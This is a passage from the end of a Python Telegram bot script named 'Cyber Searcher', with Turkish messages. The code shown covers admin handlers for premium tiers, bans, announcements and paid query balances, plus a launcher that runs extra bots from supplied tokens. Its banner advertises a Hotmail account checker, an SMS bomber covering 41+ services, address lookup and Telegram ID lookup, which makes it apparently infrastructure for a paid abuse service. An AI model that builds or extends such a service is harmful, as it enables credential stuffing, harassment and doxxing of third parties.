                    txt += f"👤 @{uname or u_id} | {package} | +{q} | {stars}⭐ | {date[5:16]}\n"
                bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
    except Exception as e:
        print(f"[ADMIN CALLBACK ERROR] {e}")
        try: bot_instance.answer_callback_query(call.id, "⚠️ Bir hata oluştu!", show_alert=True)
        except: pass

def _admin_remove(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid: bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!"); return
    removed = []
    if is_premium(tid): remove_premium(tid); removed.append("Hotmail")
    if is_premium_osint(tid): remove_premium_osint(tid); removed.append("OSINT")
    if removed: bot_instance.reply_to(msg, f"✅ @{tuname or tid} {', '.join(removed)} Premium kaldırıldı!")
    else: bot_instance.reply_to(msg, f"ℹ️ @{tuname or tid} zaten Premium değil!")

def _admin_ban(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid: bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!"); return
    m = bot_instance.reply_to(msg, f"🚫 @{tuname or tid} banlanıyor... Ban sebebini gir:")
    bot_instance.register_next_step_handler(m, lambda m: _admin_ban_reason(m, bot_instance, tid, tuname))

def _admin_ban_reason(msg, bot_instance, tid, tuname):
    reason = msg.text.strip() or "Kural ihlali"
    ban_user(tid, reason)
    bot_instance.reply_to(msg, f"🚫 @{tuname or tid} yasaklandı!\n📌 Sebep: {reason}")
    try: bot_instance.send_message(tid, f"🚫 **YASAKLANDINIZ!**\n📌 Sebep: {reason}\n📞 İtiraz için: @hackledin")
    except: pass

def _admin_unban(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid: bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!"); return
    unban_user(tid)
    bot_instance.reply_to(msg, f"✅ @{tuname or tid} banı kaldırıldı!")

def _admin_announce(msg, bot_instance):
    announcement = msg.text.strip()
    if not announcement:
        bot_instance.reply_to(msg, "❌ Kullanım: /duyuru MESAJ"); return
    users = get_all_users()
    if not users:
        bot_instance.reply_to(msg, "❌ Gönderilecek kullanıcı bulunamadı."); return
    sent = 0; failed = 0
    for user_id, username, first_name, banned in users:
        if banned: continue
        try:
            txt = f"📢 **DUYURU**\n{announcement}\n📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            bot_instance.send_message(user_id, txt); sent += 1; time.sleep(0.1)
        except: failed += 1
    bot_instance.reply_to(msg, f"✅ Duyuru gönderildi!\n✅ Başarılı: {sent}\n❌ Başarısız: {failed}\n👥 Toplam: {sent + failed}")

def _admin_tgid_give(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz format! Örnek: <code>123456789 50</code>"); return
    add_user(target, "", ""); tgid_init_user(target); tgid_add_balance(target, amount)
    bot_instance.reply_to(msg, f"✅ <b>TG-ID Bakiye Verildi!</b>\n🆔 Kullanıcı: <code>{target}</code>\n➕ Miktar: <b>+{amount}</b>\n💰 Yeni bakiye: <b>{tgid_get_balance(target)}</b>")
    try: bot_instance.send_message(target, f"🎁 <b>Admin sana Telegram ID Sorgu bakiyesi verdi!</b>\n➕ Eklenen: <b>+{amount}</b> sorgu\n💰 Yeni bakiyen: <b>{tgid_get_balance(target)}</b>")
    except: pass

def _admin_tgid_take(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        parts = msg.text.strip().split(); target = int(parts[0]); amount = int(parts[1])
        if amount <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz format! Örnek: <code>123456789 10</code>"); return
    current = tgid_get_balance(target); new_bal = max(0, current - amount)
    tgid_set(target, "query_balance", new_bal)
    bot_instance.reply_to(msg, f"✅ <b>TG-ID Bakiye Alındı!</b>\n🆔 Kullanıcı: <code>{target}</code>\n➖ Miktar: <b>-{amount}</b>\n💰 Yeni bakiye: <b>{new_bal}</b>")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    child_mode = False; child_token = None
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == "--bot" and i + 1 < len(argv):
            child_mode = True; child_token = argv[i + 1]
    if child_mode and child_token:
        print(f"[CHILD] Starting bot with token: {child_token[:10]}...")
        child_bot = telebot.TeleBot(child_token, parse_mode="HTML")
        register_handlers(child_bot)
        print(f"[CHILD] Bot {child_token[:10]}... ready!")
        try: child_bot.infinity_polling(timeout=60)
        except Exception as e: print(f"[CHILD] Polling error: {e}")
        sys.exit(0)
    main_bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
    register_handlers(main_bot)
    print("[MAIN] Starting saved bots...")
    start_saved_bots()
    print("""
╔══════════════════════════════════════════════════════╗
║       CYBER SEARCHER v4.4 — PRODUCTION               ║
║         Developer: @hackledin                        ║
╠══════════════════════════════════════════════════════╣
║  ✅ YouTube POT Provider                             ║
║  ✅ Müzik İndirici                                   ║
║  ✅ Video İndirici                                   ║
║  ✅ Adres Sorgu                                      ║
║  ✅ Hotmail Checker v4.0                             ║
║  ✅ Capture Tool                                     ║
║  ✅ SMS Bomber (41+ Servis)                          ║
║  ✅ EXIF Metadata                                    ║
║  ✅ Telegram ID Sorgu (DÜZELTİLDİ!)                  ║
║  ✅ Türkçe / English / العربية                       ║
╚══════════════════════════════════════════════════════╝
""")
    while True:
        try: main_bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"[HATA] {e}"); time.sleep(5)
